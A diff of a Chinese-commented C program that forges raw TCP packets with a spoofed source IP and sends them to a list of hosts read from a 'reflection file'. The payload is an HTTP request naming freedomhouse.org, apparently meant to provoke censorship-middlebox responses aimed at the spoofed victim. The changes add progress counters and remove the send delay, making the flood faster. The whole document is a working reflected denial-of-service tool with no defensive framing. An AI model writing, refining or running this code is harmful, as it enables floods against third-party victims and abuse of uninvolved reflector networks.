@@ -7,58 +7,57 @@
 #include <netinet/tcp.h>
 #include <unistd.h>
 
-// 计算校验和
-unsigned short checksum(void *b, int len) {
-    unsigned short *buf = b;
-    unsigned int sum = 0;
-    unsigned short result;
+// 校验和计算函数声明
+unsigned short checksum(unsigned short *b, int len);
 
-    while (len > 1) {
-        sum += *buf++;
-        len -= 2;
-    }
-
-    if (len == 1) {
-        sum += *(unsigned char *)buf;
-    }
-
-    sum = (sum >> 16) + (sum & 0xFFFF);
-    sum += (sum >> 16);
-    result = ~sum;
-    return result;
-}
-
+// 主函数
 int main(int argc, char *argv[]) {
+    // 检查参数数量
     if (argc != 4) {
-        fprintf(stderr, "Usage: %s <source_ip> <source_port> <target_file>\n", argv[0]);
+        fprintf(stderr, "Usage: %s <目标ip> <目标port> <反射文件>\n", argv[0]);
         return 1;
     }
 
-    char *source_ip = argv[1];
-    int source_port = atoi(argv[2]);
-    char *target_file = argv[3];
+    char *source_ip = argv[1];  // 源IP地址
+    int source_port = atoi(argv[2]);  // 源端口
+    char *target_file = argv[3];  // 目标文件
 
+    // 打开目标文件
     FILE *file = fopen(target_file, "r");
     if (!file) {
         perror("File open failed");
         return 1;
     }
 
-    char target_ip[16];
-    while (fgets(target_ip, sizeof(target_ip), file)) {
-        // 去除 IP 地址末尾的换行符
-        target_ip[strcspn(target_ip, "\r\n")] = 0;
+    char line[256];  // 用于存储读取的行
+    int total_count = 0;  // 总行数
 
+    // 先计算总行数
+    while (fgets(line, sizeof(line), file)) {
+        total_count++;
+    }
+
+    // 重置文件指针到开头
+    rewind(file);
+
+    int current_count = 0;  // 当前行数
+
+    // 循环逐行读取文件内容
+    while (fgets(line, sizeof(line), file)) {
+        // 去除行末的换行符
+        line[strcspn(line, "\r\n")] = 0;
+        current_count++;
+
+        // 创建原始套接字
         int sockfd;
         struct sockaddr_in dest;
         struct iphdr iph;
         struct tcphdr tcph;
         char packet[4096];
 
-        // 创建原始套接字
         sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
         if (sockfd < 0) {
-            perror("Socket creation failed");
+            printf("[%d/%d] %s 套接字创建失败\n", current_count, total_count, line);
             continue;
         }
 
@@ -74,9 +73,9 @@ int main(int argc, char *argv[]) {
         iph.protocol = IPPROTO_TCP; // TCP 协议
         iph.check = 0; // 校验和暂时设置为0，稍后计算
         iph.saddr = inet_addr(source_ip); // 源 IP 地址
-        iph.daddr = inet_addr(target_ip); // 目标 IP 地址
+        iph.daddr = inet_addr(line); // 目标 IP 地址
 
-        // IP 头部校验和
+        // 计算 IP 头部校验和
         iph.check = checksum((unsigned short *)&iph, sizeof(iph));
 
         // 填充 TCP 头部
@@ -102,7 +101,7 @@ int main(int argc, char *argv[]) {
 
         memset(&psh, 0, sizeof(psh));
         psh.source_address = inet_addr(source_ip);
-        psh.dest_address = inet_addr(target_ip);
+        psh.dest_address = inet_addr(line);
         psh.placeholder = 0;
         psh.protocol = IPPROTO_TCP;
         psh.tcp_length = htons(sizeof(tcph) + strlen("GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n"));
@@ -129,15 +128,32 @@ int main(int argc, char *argv[]) {
 
         // 发送数据包
         if (sendto(sockfd, packet, iph.tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
-            perror("Send failed");
+            printf("[%d/%d] %s 发送失败\n", current_count, total_count, line);
+        } else {
+            printf("[%d/%d] %s 发送成功\n", current_count, total_count, line);
         }
 
-        // 增加 10 毫秒延迟
-        usleep(1);
-
-        close(sockfd);
+        close(sockfd); // 关闭套接字
     }
 
-    fclose(file);
-    return 0;
+    fclose(file); // 关闭文件
+    return 0; // 退出程序
+}
+
+// 校验和计算函数的实现
+unsigned short checksum(unsigned short *b, int len) {
+    unsigned short *p = b;
+    unsigned int sum = 0;
+    unsigned short answer = 0;
+
+    for (sum = 0; len > 1; len -= 2) {
+        sum += *p++;
+    }
+    if (len == 1) {
+        sum += *(unsigned char *)p;
+    }
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    answer = ~sum;
+    return answer;
 }
